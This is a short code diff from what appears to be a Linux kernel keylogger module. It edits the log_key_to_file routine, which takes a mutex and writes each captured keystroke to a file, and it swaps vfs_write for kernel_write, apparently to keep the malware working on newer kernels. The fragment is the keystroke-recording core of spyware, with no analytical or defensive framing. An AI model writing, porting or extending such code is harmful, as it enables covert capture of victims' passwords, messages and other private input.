@@ -44,17 +44,18 @@ static void log_key_to_file(char key) {
     if (key == '\0')  
         return;
 
-  
+
     len = snprintf(log_entry, sizeof(log_entry), "%c", key);
 
- 
+  
     mutex_lock(&keylog_mutex);
 
     if (file) {
-        vfs_write(file, log_entry, len, &file->f_pos);  
+
+        kernel_write(file, log_entry, len, &file->f_pos);  
     }
 
-    mutex_unlock(&keylog_mutex); 
+    mutex_unlock(&keylog_mutex);  
 }
 
 
